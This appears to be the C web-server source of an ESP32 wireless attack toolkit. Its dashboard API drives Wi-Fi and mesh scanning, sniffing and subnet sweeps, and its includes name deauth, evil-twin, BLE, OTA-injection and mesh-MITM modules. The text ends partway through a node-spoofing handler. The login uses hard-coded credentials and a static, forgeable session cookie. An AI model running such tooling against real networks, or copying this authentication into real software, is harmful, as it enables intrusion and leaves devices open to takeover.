
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdbool.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_event.h"
#include "esp_http_server.h"
#include "cJSON.h"
#include "wifi_scanner.h"
#include "wifi_controller.h"
#include "attack_deauth.h"
#include "attack_deauth_detector.h"
#include "attack_beacon_spam.h"
#include "attack_dos.h"
#include "attack_handshake.h"
#include "attack_pmkid.h"
#include "attack_probe.h"
#include "attack_eviltwin.h"
#include "attack_karma.h"
#include "attack_csa.h"
#include "attack_pmf.h"
#include "attack_wps.h"
#include "attack_eap_audit.h"
#include "attack_bt_spam.h"
#include "bt/ble_scan.h"
#include "bt/ble_spoof.h"
#include "bt/ble_connect_flood.h"
#include "bt/ble_l2cap_flood.h"
#include "bt/ble_gatt_probe.h"
#include "bt/ble_deauth.h"
#include "attack.h"
#include "web_ui.h"
#include "ble_passkey.h"
#include "bt/ble_takeover.h"
#include "ota_common.h"
#include "ota_mqtt_sniff.h"
#include "ota_inject.h"
#include "ota_fetch.h"
#include "ota_poll_sniff.h"
#include "ota_provision.h"
#include "ota_github.h"
#include "ota_rogue_broker.h"
#include "ota_fw_analyze.h"
#include "heap_psram.h"
#include "esp_system.h"     /* for esp_get_free_heap_size() */

/* ── Mesh: mesh.h has AP scanner + local subnet scanner ──── */
#include "mesh.h"
#include "node_spoof.h"
#include "mesh_packet_inject.h"
#include "mesh_mitm.h"
#include "mesh_dos.h"
#include "mesh_eavesdrop.h"
#include "mesh_replay.h"
#include "mesh_wormhole.h"
#include "mesh_l2_deauth.h"
#include "mesh_route_poison.h"
#include "espnow_attack.h"

static const char *TAG = "WEB_SERVER";
static httpd_handle_t server_handle = NULL;
static wifi_ap_record_t dos_target = {0};
static wifi_ap_record_t handshake_target = {0};
static wifi_ap_record_t pmkid_target = {0};
static wifi_ap_record_t evil_twin_target = {0};
static wifi_ap_record_t csa_target = {0};
static wifi_ap_record_t eap_audit_target = {0};

ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);

/* Helper: get server handle (exposed via web.h) */
httpd_handle_t webserver_get_handle(void) {
    return server_handle;
}

#define USERNAME "omega"
#define PASSWORD "solutions123"

static int attack_duration_minutes = 0;
static time_t attack_start_time = 0;
static bool attack_timer_active = false;
static TaskHandle_t attack_timer_handle = NULL;

/* ================================================================== */
/*  Authentication helpers                                             */
/* ================================================================== */

static bool session_cookie_is_authenticated(const char *cookie) {
    if (cookie == NULL) {
        return false;
    }

    const char expected[] = "session=authenticated";
    const size_t expected_len = sizeof(expected) - 1;

    while (*cookie != '\0') {
        while (*cookie == ' ' || *cookie == ';') {
            cookie++;
        }

        const char *end = strchr(cookie, ';');
        size_t len = end ? (size_t)(end - cookie) : strlen(cookie);
        while (len > 0 && cookie[len - 1] == ' ') {
            len--;
        }

        if (len == expected_len && strncmp(cookie, expected, expected_len) == 0) {
            return true;
        }

        if (end == NULL) {
            break;
        }
        cookie = end + 1;
    }

    return false;
}

static bool request_is_authenticated(httpd_req_t *req) {
    char cookie[100] = {0};
    if (httpd_req_get_hdr_value_str(req, "Cookie", cookie, sizeof(cookie)) != ESP_OK) {
        return false;
    }

    return session_cookie_is_authenticated(cookie);
}

/* ================================================================== */
/*  Form / JSON helpers                                                */
/* ================================================================== */

static bool get_form_value(const char *content, const char *key, char *out, size_t out_size) {
    if (content == NULL || key == NULL || out == NULL || out_size == 0) {
        return false;
    }

    char marker[40];
    int marker_len = snprintf(marker, sizeof(marker), "%s=", key);
    if (marker_len <= 0 || (size_t)marker_len >= sizeof(marker)) {
        return false;
    }

    const char *value = strstr(content, marker);
    if (value == NULL) {
        return false;
    }
    value += marker_len;

    size_t len = strcspn(value, "&");
    if (len >= out_size) {
        len = out_size - 1;
    }

    memcpy(out, value, len);
    out[len] = '\0';

    char *src = out;
    char *dst = out;
    while (*src) {
        if (*src == '+') {
            *dst++ = ' ';
            src++;
            continue;
        }
        if (*src == '%' && src[1] && src[2]) {
            int hi = src[1];
            int lo = src[2];
            hi = (hi >= '0' && hi <= '9') ? (hi - '0') :
                 (hi >= 'a' && hi <= 'f') ? (hi - 'a' + 10) :
                 (hi >= 'A' && hi <= 'F') ? (hi - 'A' + 10) : -1;
            lo = (lo >= '0' && lo <= '9') ? (lo - '0') :
                 (lo >= 'a' && lo <= 'f') ? (lo - 'a' + 10) :
                 (lo >= 'A' && lo <= 'F') ? (lo - 'A' + 10) : -1;
            if (hi >= 0 && lo >= 0) {
                *dst++ = (char)((hi << 4) | lo);
                src += 3;
                continue;
            }
        }
        *dst++ = *src++;
    }
    *dst = '\0';
    while (dst > out && (dst[-1] == '\r' || dst[-1] == '\n' || dst[-1] == ' ' || dst[-1] == '\t')) {
        *--dst = '\0';
    }
    return true;
}

static bool parse_bssid(const char *value, uint8_t bssid[6]) {
    if (value == NULL || bssid == NULL) {
        return false;
    }

    unsigned int bytes[6];
    if (sscanf(value, "%2x:%2x:%2x:%2x:%2x:%2x",
               &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5]) != 6) {
        return false;
    }

    for (size_t i = 0; i < 6; i++) {
        if (bytes[i] > 0xff) {
            return false;
        }
        bssid[i] = (uint8_t)bytes[i];
    }

    return true;
}

static bool fill_ap_record_from_json(cJSON *root, wifi_ap_record_t *record, bool require_ssid) {
    if (root == NULL || record == NULL) {
        return false;
    }

    cJSON *bssid_json = cJSON_GetObjectItem(root, "bssid");
    cJSON *channel_json = cJSON_GetObjectItem(root, "channel");
    cJSON *ssid_json = cJSON_GetObjectItem(root, "ssid");

    if (!cJSON_IsString(bssid_json) || !cJSON_IsNumber(channel_json)) {
        return false;
    }
    if (require_ssid && !cJSON_IsString(ssid_json)) {
        return false;
    }
    if (channel_json->valueint <= 0 || channel_json->valueint > 14) {
        return false;
    }

    memset(record, 0, sizeof(*record));
    if (!parse_bssid(bssid_json->valuestring, record->bssid)) {
        return false;
    }

    record->primary = (uint8_t)channel_json->valueint;
    if (cJSON_IsString(ssid_json) && ssid_json->valuestring != NULL) {
        strncpy((char *)record->ssid, ssid_json->valuestring, sizeof(record->ssid) - 1);
        record->ssid[sizeof(record->ssid) - 1] = '\0';
    }

    return true;
}

static esp_err_t send_json_response(httpd_req_t *req, cJSON *root) {
    if (root == NULL) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON allocation failed");
        return ESP_FAIL;
    }

    char *response = cJSON_PrintUnformatted(root);
    if (response == NULL) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON serialization failed");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    esp_err_t err = httpd_resp_send(req, response, strlen(response));
    cJSON_Delete(root);
    free(response);
    return err;
}

static esp_err_t send_success_response(httpd_req_t *req) {
    cJSON *response = cJSON_CreateObject();
    if (response != NULL) {
        cJSON_AddBoolToObject(response, "success", true);
    }
    return send_json_response(req, response);
}

static wifi_ap_record_t *scan_networks(size_t *ap_count) {
    if (ap_count == NULL) {
        return NULL;
    }

    scanner_scan();
    const wifictl_ap_records_t *records = scanner_get_records();
    if (records == NULL || records->count == 0) {
        *ap_count = 0;
        return NULL;
    }

    *ap_count = records->count;
    wifi_ap_record_t *copy = heap_psram_malloc(sizeof(wifi_ap_record_t) * records->count);
    if (copy == NULL) {
        return NULL;
    }

    memcpy(copy, records->records, sizeof(wifi_ap_record_t) * records->count);
    return copy;
}

static bool is_attack_active(void) {
    const attack_status_t *status = attack_get_status();
    return status && status->state == RUNNING;
}

static void get_attack_target(char *target) {
    if (target == NULL) {
        return;
    }

    const attack_status_t *status = attack_get_status();
    if (status == NULL || status->content == NULL || status->content_size == 0) {
        target[0] = '\0';
        return;
    }

    size_t len = status->content_size < 127 ? status->content_size : 127;
    memcpy(target, status->content, len);
    target[len] = '\0';
}

static void attack_timer_task(void *pvParameters) {
    while (attack_timer_active) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        int remaining = (attack_duration_minutes * 60) - (time(NULL) - attack_start_time);
        if (remaining <= 0 && attack_duration_minutes > 0) {
            attack_timer_active = false;
            stop_deauth_attack();
            break;
        }
    }
    attack_timer_handle = NULL;
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  LOGIN HANDLERS                                                     */
/* ================================================================== */

static esp_err_t login_post_handler(httpd_req_t *req) {
    char content[256] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    
    char username[32] = {0}, password[32] = {0};
    get_form_value(content, "username", username, sizeof(username));
    get_form_value(content, "password", password, sizeof(password));
    
    if (strcmp(username, USERNAME) == 0 && strcmp(password, PASSWORD) == 0) {
        httpd_resp_set_hdr(req, "Set-Cookie", "session=authenticated; path=/");
        httpd_resp_set_hdr(req, "Location", "/dashboard");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
    } else {
        httpd_resp_set_hdr(req, "Location", "/login?error=1");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
    }
    return ESP_OK;
}

static esp_err_t dashboard_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_set_hdr(req, "Location", "/login");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
        return ESP_OK;
    }
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_sendstr_chunk(req, advanced_dashboard_html);
    httpd_resp_sendstr_chunk(req, NULL);  /* terminate chunked response */
    return ESP_OK;
}

static esp_err_t login_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_sendstr_chunk(req, advanced_login_html);
    httpd_resp_sendstr_chunk(req, NULL);  /* terminate chunked response */
    return ESP_OK;
}

static esp_err_t logout_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Set-Cookie", "session=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT");
    httpd_resp_set_hdr(req, "Location", "/login");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_send(req, "", 0);
    return ESP_OK;
}

static esp_err_t root_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Location", "/login");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_send(req, "", 0);
    return ESP_OK;
}

/* ================================================================== */
/*  WiFi API HANDLERS                                                  */
/* ================================================================== */

static esp_err_t scan_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    size_t ap_count = 0;
    wifi_ap_record_t *ap_records = scan_networks(&ap_count);
    if (ap_records == NULL && ap_count > 0) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Scan failed");
        return ESP_FAIL;
    }
    cJSON *root = cJSON_CreateArray();
    if (root == NULL) {
        heap_psram_free(ap_records);
        return send_json_response(req, root);
    }
    for (size_t i = 0; i < ap_count; i++) {
        if (ap_records[i].ssid[0] == 0) continue;
        cJSON *network = cJSON_CreateObject();
        if (network == NULL) {
            heap_psram_free(ap_records);
            cJSON_Delete(root);
            return send_json_response(req, NULL);
        }
        cJSON_AddStringToObject(network, "ssid", (char*)ap_records[i].ssid);
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(ap_records[i].bssid));
        cJSON_AddStringToObject(network, "bssid", bssid_str);
        cJSON_AddNumberToObject(network, "channel", ap_records[i].primary);
        cJSON_AddNumberToObject(network, "rssi", ap_records[i].rssi);
        const char *auth = "Open";
        if (ap_records[i].authmode == WIFI_AUTH_WEP) auth = "WEP";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA_PSK) auth = "WPA";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA2_PSK) auth = "WPA2";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA_WPA2_PSK) auth = "WPA/WPA2";
        cJSON_AddStringToObject(network, "authmode", auth);
        cJSON_AddItemToArray(root, network);
    }
    heap_psram_free(ap_records);
    return send_json_response(req, root);
}

static esp_err_t mgmt_ap_get_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char ssid[33] = {0};
    char pass[64] = {0};
    if (wifictl_mgmt_ap_get_creds(ssid, sizeof(ssid), pass, sizeof(pass)) != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to read AP config");
        return ESP_FAIL;
    }

    cJSON *root = cJSON_CreateObject();
    if (root != NULL) {
        cJSON_AddStringToObject(root, "ssid", ssid);
        cJSON_AddBoolToObject(root, "secured", strlen(pass) >= 8);
    }
    return send_json_response(req, root);
}

static esp_err_t mgmt_ap_set_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[256];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *ssid_json = cJSON_GetObjectItem(root, "ssid");
    cJSON *pass_json = cJSON_GetObjectItem(root, "password");
    if (!cJSON_IsString(ssid_json) || !cJSON_IsString(pass_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid/password");
        return ESP_FAIL;
    }

    esp_err_t err = wifictl_mgmt_ap_set_creds(ssid_json->valuestring, pass_json->valuestring);
    cJSON_Delete(root);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid SSID/password");
        return ESP_FAIL;
    }

    wifictl_mgmt_ap_stop();
    wifictl_mgmt_ap_start();
    return send_success_response(req);
}

static esp_err_t mgmt_ap_reset_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    if (wifictl_mgmt_ap_clear_creds() != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to clear AP config");
        return ESP_FAIL;
    }

    wifictl_mgmt_ap_stop();
    wifictl_mgmt_ap_start();
    return send_success_response(req);
}

/* ================================================================== */
/*  MESH NODE SCANNER — calls mesh_scan_active_nearby() from node_scanner.c */
/* ================================================================== */

static esp_err_t mesh_scan_api_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_active_result_t *result = heap_psram_malloc(sizeof(mesh_active_result_t));
    if (!result) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
                            "Mesh scan failed - no heap");
        return ESP_FAIL;
    }

    esp_err_t err = mesh_scan_active_nearby(result);
    if (err != ESP_OK) {
        heap_psram_free(result);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
                            "Mesh scan failed - WiFi unavailable (try Stop All, then rescan)");
        return ESP_FAIL;
    }

    const scan_result_t *nearby = &result->nearby;
    const mesh_scan_result_t *local = &result->local;

    char parent_ip_str[16];
    snprintf(parent_ip_str, sizeof(parent_ip_str), "%u.%u.%u.%u",
             local->parent_ip[0], local->parent_ip[1],
             local->parent_ip[2], local->parent_ip[3]);

    char parent_mac_str[18] = "";
    if (local->parent_mac_set) {
        snprintf(parent_mac_str, sizeof(parent_mac_str),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 local->parent_mac[0], local->parent_mac[1],
                 local->parent_mac[2], local->parent_mac[3],
                 local->parent_mac[4], local->parent_mac[5]);
    }

    cJSON *root = cJSON_CreateObject();
    if (!root) { heap_psram_free(result); return send_json_response(req, root); }

    cJSON_AddStringToObject(root, "parent_ip", parent_ip_str);
    cJSON_AddStringToObject(root, "parent_mac", parent_mac_str);
    cJSON_AddNumberToObject(root, "total_nodes", local->total_nodes);
    cJSON_AddNumberToObject(root, "total_aps", nearby->total_aps);
    cJSON_AddNumberToObject(root, "mesh_count", nearby->mesh_count);
    cJSON_AddNumberToObject(root, "group_count", nearby->group_count);

    if (nearby->total_aps == 0 && local->total_nodes == 0) {
        cJSON_AddStringToObject(root, "warning",
            "No nearby APs or connected stations. Stop any running attack, wait a few seconds, then Scan Mesh again.");
    } else if (local->total_nodes == 0) {
        cJSON_AddStringToObject(root, "warning",
            "Active nodes only appear for devices connected to this device's management AP (192.168.4.x).");
    } else if (nearby->total_aps == 0) {
        cJSON_AddStringToObject(root, "warning",
            "No nearby Wi-Fi APs seen — check antenna/range or stop attacks that changed Wi-Fi mode.");
    }

    /* Active nodes: MAC + IP from soft-AP station list */
    cJSON *nodes = cJSON_CreateArray();
    for (int i = 0; i < local->total_nodes && i < MESH_MAX_NODES; i++) {
        cJSON *n = cJSON_CreateObject();
        if (!n) continue;

        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%u.%u.%u.%u",
                 local->nodes[i].ip[0], local->nodes[i].ip[1],
                 local->nodes[i].ip[2], local->nodes[i].ip[3]);

        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 local->nodes[i].mac[0], local->nodes[i].mac[1],
                 local->nodes[i].mac[2], local->nodes[i].mac[3],
                 local->nodes[i].mac[4], local->nodes[i].mac[5]);

        cJSON_AddStringToObject(n, "ip", ip_str);
        cJSON_AddStringToObject(n, "mac", mac_str);
        cJSON_AddStringToObject(n, "role", "child");
        cJSON_AddStringToObject(n, "status", local->nodes[i].online ? "online" : "offline");
        cJSON_AddNumberToObject(n, "rtt_ms", local->nodes[i].rtt_ms);
        cJSON_AddNumberToObject(n, "index", i + 1);
        cJSON_AddItemToArray(nodes, n);
    }
    cJSON_AddItemToObject(root, "nodes", nodes);

    /* Nearby APs (MAC only — no IP for over-the-air BSSIDs) */
    cJSON *aps = cJSON_CreateArray();
    for (int i = 0; i < nearby->total_aps && i < SCANNER_MAX_AP; i++) {
        const scanner_ap_t *ap = &nearby->aps[i];
        cJSON *a = cJSON_CreateObject();
        if (!a) continue;

        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);

        cJSON_AddStringToObject(a, "mac", mac_str);
        cJSON_AddStringToObject(a, "bssid", mac_str);
        cJSON_AddStringToObject(a, "ssid",
            ap->is_hidden ? "(hidden)" : ap->ssid);
        cJSON_AddNumberToObject(a, "channel", ap->channel);
        cJSON_AddNumberToObject(a, "rssi", ap->rssi);
        cJSON_AddBoolToObject(a, "espressif", ap->is_espressif);
        cJSON_AddStringToObject(a, "ip", "—");
        cJSON_AddItemToArray(aps, a);
    }
    cJSON_AddItemToObject(root, "aps", aps);

    /* Mesh groups (SSID clusters) */
    cJSON *groups = cJSON_CreateArray();
    for (int i = 0; i < nearby->group_count && i < SCANNER_MAX_AP; i++) {
        const mesh_group_t *g = &nearby->groups[i];
        cJSON *grp = cJSON_CreateObject();
        if (!grp) continue;

        cJSON_AddStringToObject(grp, "ssid", g->ssid);
        cJSON_AddNumberToObject(grp, "node_count", g->node_count);
        cJSON_AddNumberToObject(grp, "channel", g->channel);
        cJSON_AddBoolToObject(grp, "likely_mesh", g->likely_mesh);
        cJSON_AddBoolToObject(grp, "all_same_channel", g->all_same_channel);
        cJSON_AddBoolToObject(grp, "all_espressif", g->all_espressif);

        cJSON *gnodes = cJSON_CreateArray();
        for (int j = 0; j < g->node_count && j < SCANNER_MAX_GROUP_NODES; j++) {
            const scanner_ap_t *nd = &g->nodes[j];
            cJSON *gn = cJSON_CreateObject();
            if (!gn) continue;

            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     nd->bssid[0], nd->bssid[1], nd->bssid[2],
                     nd->bssid[3], nd->bssid[4], nd->bssid[5]);

            cJSON_AddStringToObject(gn, "mac", mac_str);
            cJSON_AddStringToObject(gn, "bssid", mac_str);
            cJSON_AddNumberToObject(gn, "channel", nd->channel);
            cJSON_AddNumberToObject(gn, "rssi", nd->rssi);
            cJSON_AddBoolToObject(gn, "espressif", nd->is_espressif);
            cJSON_AddStringToObject(gn, "ip", "—");
            cJSON_AddItemToArray(gnodes, gn);
        }
        cJSON_AddItemToObject(grp, "nodes", gnodes);
        cJSON_AddItemToArray(groups, grp);
    }
    cJSON_AddItemToObject(root, "groups", groups);

    ESP_LOGI(TAG, "MESH: Parent=%s MAC=%s, %u active, %u nearby APs, %u groups",
             parent_ip_str,
             parent_mac_str[0] ? parent_mac_str : "(unknown)",
             (unsigned)local->total_nodes,
             (unsigned)nearby->total_aps, (unsigned)nearby->group_count);

    heap_psram_free(result);
    return send_json_response(req, root);
}

/* ── MESH SNIFF HANDLERS ─────────────────────────────────────── */

static esp_err_t mesh_sniff_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[32] = {0};
    uint8_t duration = MESH_SNIFF_DEFAULT_SEC;
    if (httpd_req_get_url_query_len(req) > 0) {
        httpd_req_get_url_query_str(req, buf, sizeof(buf));
        char *d = strstr(buf, "duration=");
        if (d) { int v = atoi(d + 9); if (v >= 3 && v <= 30) duration = (uint8_t)v; }
    }

    if (mesh_sniff_is_running()) {
        cJSON *root = cJSON_CreateObject();
        cJSON_AddStringToObject(root, "status", "scanning");
        cJSON_AddNumberToObject(root, "total_found", 0);
        return send_json_response(req, root);
    }

    if (mesh_sniff_start(duration) != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
                            "Failed to start mesh sniff");
        return ESP_FAIL;
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "status", "scanning");
    cJSON_AddStringToObject(root, "message", "Mesh sniff started");
    cJSON_AddNumberToObject(root, "duration", duration);
    return send_json_response(req, root);
}

static esp_err_t mesh_sniff_results_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const mesh_sniff_result_t *r = mesh_sniff_get_results();
    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "status",
        mesh_sniff_is_running() ? "scanning" : "done");
    cJSON_AddNumberToObject(root, "total_found",     r->total_found);
    cJSON_AddNumberToObject(root, "espressif_count",  r->espressif_count);
    cJSON_AddNumberToObject(root, "parents_found",    r->parents_found);
    cJSON_AddNumberToObject(root, "scan_time_ms",     r->scan_time_ms);

    cJSON *nodes = cJSON_CreateArray();
    for (int i = 0; i < r->total_found && i < MESH_SNIFF_MAX_NODES; i++) {
        cJSON *n = cJSON_CreateObject();
        if (!n) continue;
        const mesh_sniffed_node_t *nd = &r->nodes[i];

        char mac[18], par[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 nd->child_mac[0], nd->child_mac[1], nd->child_mac[2],
                 nd->child_mac[3], nd->child_mac[4], nd->child_mac[5]);
        snprintf(par, sizeof(par), "%02X:%02X:%02X:%02X:%02X:%02X",
                 nd->parent_bssid[0], nd->parent_bssid[1], nd->parent_bssid[2],
                 nd->parent_bssid[3], nd->parent_bssid[4], nd->parent_bssid[5]);

        cJSON_AddStringToObject(n, "mac",    mac);
        cJSON_AddStringToObject(n, "parent", par);
        cJSON_AddNumberToObject(n, "rssi",       nd->rssi);
        cJSON_AddNumberToObject(n, "channel",    nd->channel);
        cJSON_AddBoolToObject(n,   "espressif",  nd->is_espressif);
        cJSON_AddStringToObject(n, "frame",
            (nd->frame_type == MESH_SNIFF_FRAME_AUTH) ? "auth" : "assoc");
        cJSON_AddNumberToObject(n, "index", i + 1);
        cJSON_AddItemToArray(nodes, n);
    }
    cJSON_AddItemToObject(root, "nodes", nodes);
    return send_json_response(req, root);
}
/* ── REMOTE NETWORK SCAN HANDLERS ─────────────────────────────── */

static esp_err_t mesh_remote_scan_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[256] = {0};
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
        return ESP_FAIL;
    }
    buf[len] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    const char *ssid = cJSON_GetStringValue(cJSON_GetObjectItem(root, "ssid"));
    const char *pass = cJSON_GetStringValue(cJSON_GetObjectItem(root, "password"));

    if (!ssid || !pass) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid/password");
        return ESP_FAIL;
    }

    /* COPY before deleting cJSON — otherwise dangling pointer */
    char ssid_buf[33] = {0};
    char pass_buf[65] = {0};
    strncpy(ssid_buf, ssid, sizeof(ssid_buf) - 1);
    strncpy(pass_buf, pass, sizeof(pass_buf) - 1);
    cJSON_Delete(root);

    if (mesh_remote_scan_is_running()) {
        cJSON *r = cJSON_CreateObject();
        cJSON_AddStringToObject(r, "status", "scanning");
        return send_json_response(req, r);
    }

    if (mesh_remote_scan_start(ssid_buf, pass_buf) != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Start failed");
        return ESP_FAIL;
    }

    cJSON *r = cJSON_CreateObject();
    cJSON_AddStringToObject(r, "status", "scanning");
    cJSON_AddStringToObject(r, "message", "Remote scan started - AP down ~30s");
    return send_json_response(req, r);
}
static esp_err_t mesh_remote_results_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const mesh_remote_result_t *r = mesh_remote_scan_get_results();
    cJSON *root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root, "scanning", r->scanning);
    cJSON_AddBoolToObject(root, "done", r->done);
    cJSON_AddStringToObject(root, "target_ssid", r->target_ssid);

    char tip[16] = "0.0.0.0";
    if (r->gateway_ip[0]) {
        snprintf(tip, sizeof(tip), "%u.%u.%u.%u",
                 r->gateway_ip[0], r->gateway_ip[1],
                 r->gateway_ip[2], r->gateway_ip[3]);
    }
    cJSON_AddStringToObject(root, "gateway_ip", tip);

    char nm[16] = "0.0.0.0";
    if (r->netmask[0]) {
        snprintf(nm, sizeof(nm), "%u.%u.%u.%u",
                 r->netmask[0], r->netmask[1],
                 r->netmask[2], r->netmask[3]);
    }
    cJSON_AddStringToObject(root, "netmask", nm);

    cJSON_AddNumberToObject(root, "total_found", r->total_found);
    cJSON_AddNumberToObject(root, "esp32_count", r->esp32_count);
    cJSON_AddNumberToObject(root, "total_alive", r->total_alive);
    cJSON_AddNumberToObject(root, "sweep_time_ms", r->sweep_time_ms);

    cJSON *nodes = cJSON_CreateArray();
    for (int i = 0; i < r->total_found && i < MESH_REMOTE_MAX_NODES; i++) {
        cJSON *n = cJSON_CreateObject();
        if (!n) continue;
        const mesh_remote_node_t *nd = &r->nodes[i];

        char ip[16];
        snprintf(ip, sizeof(ip), "%u.%u.%u.%u",
                 nd->ip[0], nd->ip[1], nd->ip[2], nd->ip[3]);
         cJSON_AddStringToObject(n, "ip", ip);

        if (nd->has_mac) {
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     nd->mac[0], nd->mac[1], nd->mac[2],
                     nd->mac[3], nd->mac[4], nd->mac[5]);
            cJSON_AddStringToObject(n, "mac", mac_str);
        } else {
            cJSON_AddStringToObject(n, "mac", "N/A");
        }

        cJSON_AddBoolToObject(n, "port80", nd->port80);
        cJSON_AddBoolToObject(n, "port5555", nd->port5555);
        cJSON_AddBoolToObject(n, "is_esp32", nd->is_esp32);
        cJSON_AddNumberToObject(n, "index", i + 1);
        cJSON_AddItemToArray(nodes, n);
    }
    cJSON_AddItemToObject(root, "nodes", nodes);
    return send_json_response(req, root);
}

/* ================================================================== */
/*  NODE SPOOF HANDLERS                                                */
/* ================================================================== */

static esp_err_t spoof_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[256] = {0};
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
        return ESP_FAIL;
    }

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *jmac  = cJSON_GetObjectItem(root, "mac");
    cJSON *jssid = cJSON_GetObjectItem(root, "ssid");
